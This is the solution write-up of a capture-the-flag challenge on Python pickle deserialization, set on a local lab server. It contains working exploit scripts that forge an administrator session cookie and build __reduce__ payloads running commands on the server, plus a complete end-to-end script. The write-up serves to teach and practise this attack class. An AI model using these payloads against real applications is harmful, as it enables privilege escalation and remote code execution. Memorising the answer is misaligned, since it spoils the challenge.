## Solution

<details>
<summary>Click to reveal solution</summary>

### Phase 1: Understanding the Session Format

#### Step 1: Login and Capture Session

1. Navigate to http://localhost:4008/login
2. Login with any credentials where username equals password (e.g., `test` / `test`)
3. Capture the `session` cookie from your browser (DevTools → Application → Cookies)

The cookie is a base64-encoded pickle object.

#### Step 2: Decode the Session

```python
import pickle
import base64

# Example session cookie
session_cookie = "gASVRQAAAAAAAACMCF9fbWFpbl9flIwLVXNlclNlc3Npb26Uk5QpgZR9lCiMCHVzZXJuYW1llIwEdGVzdJSMBHJvbGWUjAR1c2VylIwNYXV0aGVudGljYXRlZJSIjApjcmVhdGVkX2F0lIwaMjAyNi0wMS0xOVQxMjozNDo1Ni4xMjM0NTaUdWIu"

# Decode base64
decoded = base64.b64decode(session_cookie)

# Unpickle (DANGEROUS - only for analysis)
session_obj = pickle.loads(decoded)

print(f"Username: {session_obj.username}")
print(f"Role: {session_obj.role}")
print(f"Authenticated: {session_obj.authenticated}")
```

### Phase 2: FLAG 1 - Privilege Escalation

#### Step 3: Modify Session to Administrator

```python
#!/usr/bin/env python3
import pickle
import base64
import requests

BASE_URL = "http://localhost:4008"

# Create a UserSession class matching the server
class UserSession:
    def __init__(self, username, role='user', authenticated=False):
        self.username = username
        self.role = role
        self.authenticated = authenticated
        self.created_at = "2026-01-19T12:00:00.000000"

# Create admin session
admin_session = UserSession(
    username="attacker",
    role="administrator",  # Changed from "user" to "administrator"
    authenticated=True
)

# Serialize to pickle and encode
pickled = pickle.dumps(admin_session)
malicious_cookie = base64.b64encode(pickled).decode('utf-8')

print(f"[+] Malicious cookie: {malicious_cookie}")

# Send request with modified cookie
session = requests.Session()
session.cookies.set('session', malicious_cookie)

response = session.get(f"{BASE_URL}/dashboard")

# Extract FLAG 1
if "FLAG{" in response.text:
    import re
    flag = re.search(r'FLAG\{[^}]+\}', response.text)
    if flag:
        print(f"\n🚩 FLAG 1: {flag.group(0)}")
```

Alternatively, you can use the API endpoint:

```bash
curl -X POST http://localhost:4008/api/validate \
  -H "Content-Type: application/json" \
  -d '{"session": "YOUR_MODIFIED_COOKIE_HERE"}'
```

### Phase 3: FLAG 2 - Remote Code Execution

#### Step 4: Craft Malicious Pickle Payload

Python pickle supports special methods like `__reduce__` that can execute arbitrary code during deserialization. The challenge has a dedicated `/api/execute` endpoint that deserializes the session payload and returns command output directly in the response.

```python
#!/usr/bin/env python3
import pickle
import base64
import subprocess
import urllib.request
import json

# Build malicious pickle that captures output via subprocess
class Exploit(object):
    def __reduce__(self):
        return (subprocess.check_output, (['cat', '/home/ctfuser/flag2.txt'],))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()

# POST to /api/execute
data = json.dumps({'session': payload}).encode()
req = urllib.request.Request('http://localhost:4008/api/execute', data=data, method='POST')
req.add_header('Content-Type', 'application/json')
with urllib.request.urlopen(req) as r:
    print(json.loads(r.read())['output'])
```

This uses `subprocess.check_output` directly in `__reduce__`, which captures stdout and returns it to the caller. The `/api/execute` endpoint then includes the output in the JSON response.

#### Step 5: Alternative Payloads

```python
import pickle
import base64
import os

# Alternative using os.popen (output returned as string)
class RCE2:
    def __reduce__(self):
        return (os.popen, ("cat /home/ctfuser/flag2.txt",))

# Note: os.popen returns a file object, not a string — subprocess is preferred
```

### Complete Exploit Script

```python
#!/usr/bin/env python3
import pickle
import base64
import subprocess
import urllib.request
import urllib.parse
import json

BASE_URL = "http://localhost:4008"

print("=" * 60)
print("Pickle Deserialization Exploit")
print("=" * 60)

# FLAG 1: Privilege Escalation
print("\n[Phase 1] Privilege Escalation to Administrator")
print("-" * 60)

class UserSession:
    def __init__(self, username, role='user', authenticated=False):
        self.username = username
        self.role = role
        self.authenticated = authenticated
        self.created_at = "2026-01-19T12:00:00"

admin_session = UserSession("hacker", "administrator", True)
cookie = base64.b64encode(pickle.dumps(admin_session)).decode()

data = json.dumps({'session': cookie}).encode()
req = urllib.request.Request(f"{BASE_URL}/api/validate", data=data, method='POST')
req.add_header('Content-Type', 'application/json')
with urllib.request.urlopen(req) as r:
    result = json.loads(r.read())
    if result.get('flag'):
        print(f"🚩 FLAG 1: {result['flag']}")

# FLAG 2: Remote Code Execution via /api/execute
print("\n[Phase 2] Remote Code Execution")
print("-" * 60)

class Exploit(object):
    def __reduce__(self):
        return (subprocess.check_output, (['cat', '/home/ctfuser/flag2.txt'],))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()

data = json.dumps({'session': payload}).encode()
req = urllib.request.Request(f"{BASE_URL}/api/execute", data=data, method='POST')
req.add_header('Content-Type', 'application/json')
with urllib.request.urlopen(req) as r:
    result = json.loads(r.read())
    print(f"🚩 FLAG 2: {result.get('output', '').strip()}")

print("\n" + "=" * 60)
```

</details>